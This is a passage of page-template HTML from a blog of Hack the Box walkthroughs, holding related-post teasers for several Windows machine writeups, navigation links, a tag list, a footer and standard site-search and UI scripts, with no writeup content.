data-toc-skip>Further Reading</h3><div class="card-deck mb-4"><div class="card"> <a href="/posts/HTB-Sauna/"><div class="card-body"> <em class="timeago small" data-ts="1591466400" > 2020-06-06 </em><h3 class="pt-0 mt-1 mb-3" data-toc-skip>Hack the Box - Sauna</h3><div class="text-muted small"><p> This is my guide to the HackTheBox Windows machine Sauna. These HTB writeups have been migrated from a standalone repository for ease of access. However, I wrote these to learn and can’t atte...</p></div></div></a></div><div class="card"> <a href="/posts/HTB-Remote/"><div class="card-body"> <em class="timeago small" data-ts="1593799200" > 2020-07-03 </em><h3 class="pt-0 mt-1 mb-3" data-toc-skip>Hack the Box - Remote</h3><div class="text-muted small"><p> This writeup is for the HackTheBox Windows machine Remote. These HTB writeups have been migrated from a standalone repository for ease of access. However, I wrote these to learn and can’t att...</p></div></div></a></div><div class="card"> <a href="/posts/HTB-Cascade/"><div class="card-body"> <em class="timeago small" data-ts="1593972000" > 2020-07-05 </em><h3 class="pt-0 mt-1 mb-3" data-toc-skip>Hack the Box - Cascade</h3><div class="text-muted small"><p> This is my guide to the HackTheBox Windows machine Cascade. These HTB writeups have been migrated from a standalone repository for ease of access. However, I wrote these to learn and can’t at...</p></div></div></a></div></div></div><div class="post-navigation d-flex justify-content-between"> <a href="/posts/HTB-OpenAdmin/" class="btn btn-outline-primary" prompt="Older"><p>Hack The Box - OpenAdmin</p></a> <a href="/posts/HTB-Traceback/" class="btn btn-outline-primary" prompt="Newer"><p>Hack the Box - Traceback</p></a></div></div></div></div><footer class="d-flex w-100 justify-content-center"><div class="d-flex justify-content-between align-items-center text-muted"><div class="footer-left"><p class="mb-0"> © 2022 <a href="https://twitter.com/username">Chris</a>. <span data-toggle="tooltip" data-placement="top" title="Except where otherwise noted, the blog posts on this site are licensed under the Creative Commons Attribution 4.0 International (CC BY 4.0) License by the author.">Some rights reserved.</span></p></div><div class="footer-right"><p class="mb-0"> Powered by <a href="https://jekyllrb.com" target="_blank" rel="noopener">Jekyll</a> with <a href="https://github.com/cotes2020/jekyll-theme-chirpy" target="_blank" rel="noopener">Chirpy</a> theme.</p></div></div></footer></div><div id="search-result-wrapper" class="d-flex justify-content-center unloaded"><div class="col-12 col-sm-11 post-content"><div id="search-hints"><div id="access-tags"><div class="panel-heading">Trending Tags</div><div class="d-flex flex-wrap mt-3 mb-1 mr-3"> <a class="post-tag" href="/tags/ctf/">ctf</a> <a class="post-tag" href="/tags/htb/">htb</a> <a class="post-tag" href="/tags/windows/">windows</a> <a class="post-tag" href="/tags/linux/">linux</a> <a class="post-tag" href="/tags/walkthrough/">walkthrough</a> <a class="post-tag" href="/tags/active-directory/">active directory</a> <a class="post-tag" href="/tags/blog/">blog</a> <a class="post-tag" href="/tags/c/">c</a> <a class="post-tag" href="/tags/discovery/">discovery</a> <a class="post-tag" href="/tags/edr/">edr</a></div></div></div><div id="search-results" class="d-flex flex-wrap justify-content-center text-muted mt-3"></div></div></div></div><div id="mask"></div><a id="back-to-top" href="#" aria-label="back-to-top" class="btn btn-lg btn-box-shadow" role="button"> <i class="fas fa-angle-up"></i> </a> <script src="https://cdn.jsdelivr.net/npm/simple-jekyll-search@1.10.0/dest/simple-jekyll-search.min.js"></script> <script> SimpleJekyllSearch({ searchInput: document.getElementById('search-input'), resultsContainer: document.getElementById('search-results'), json: '/assets/js/data/search.json', searchResultTemplate: '<div class="pl-1 pr-1 pl-sm-2 pr-sm-2 pl-lg-4 pr-lg-4 pl-xl-0 pr-xl-0"> <a href="{url}">{title}</a><div class="post-meta d-flex flex-column flex-sm-row text-muted mt-1 mb-1"> {categories} {tags}</div><p>{snippet}</p></div>', noResultsText: '<p class="mt-5">Oops! No result founds.</p>', templateMiddleware: function(prop, value, template) { if (prop === 'categories') { if (value === '') { return `${value}`; } else { return `<div class="mr-sm-4"><i class="far fa-folder fa-fw"></i>${value}</div>`; } } if (prop === 'tags') { if (value === '') { return `${value}`; } else { return `<div><i class="fa fa-tag fa-fw"></i>${value}</div>`; } } } }); </script> <script src="https://cdn.jsdelivr.net/combine/npm/magnific-popup@1/dist/jquery.magnific-popup.min.js,npm/lozad/dist/lozad.min.js,npm/clipboard@2/dist/clipboard.min.js"></script> <script src="https://cdn.jsdelivr.net/combine/npm/dayjs@1/dayjs.min.js,npm/dayjs@1/locale/en.min.js,npm/dayjs@1/plugin/relativeTime.min.js,npm/dayjs@1/plugin/localizedFormat.min.js"></script> <script defer src="/assets/js/dist/post.min.js"></script> <script src="https://cdn.jsdelivr.net/npm/bootstrap@4/dist/js/bootstrap.bundle.min.js"></script> <script defer src="/app.js"></script>
